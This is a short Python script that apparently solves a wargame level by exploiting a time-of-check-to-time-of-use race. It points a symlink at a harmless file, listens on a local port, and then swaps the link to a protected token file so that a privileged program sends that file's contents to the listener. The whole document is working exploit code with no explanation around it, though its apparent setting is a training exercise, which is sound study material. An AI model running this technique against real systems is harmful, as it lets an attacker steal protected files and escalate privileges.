import socket
import select
import os

link_name = "/tmp/symswitch"
ok_target = "/tmp/ok_target"
end_target = "/home/user/level10/token"

print("Creating server socket...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 6969))

if not os.path.exists(ok_target):
    os.system("touch " + ok_target)
    os.system("chmod 444 " + ok_target)

print("Creating symlink...")
if os.path.exists(link_name):
    os.unlink(link_name)
os.symlink(ok_target, link_name)
print("Symlink created: " + link_name + " -> " + ok_target)

print("Listening for connections...")
# sock.setblocking(False)
sock.listen(1)

print("Waiting for connection...")
ready = select.select([sock], [], [], 999)
if not ready[0]:
    print("No connection within timeout")
    exit(1)

print("Switching symlink...")
os.unlink(link_name)
os.symlink(end_target, link_name)
os.system("sync")

print("Switched symlink to " + end_target)

print("Accepting connection...")
conn, addr = sock.accept()

msg = conn.recv(4096)
print("Received: " + msg)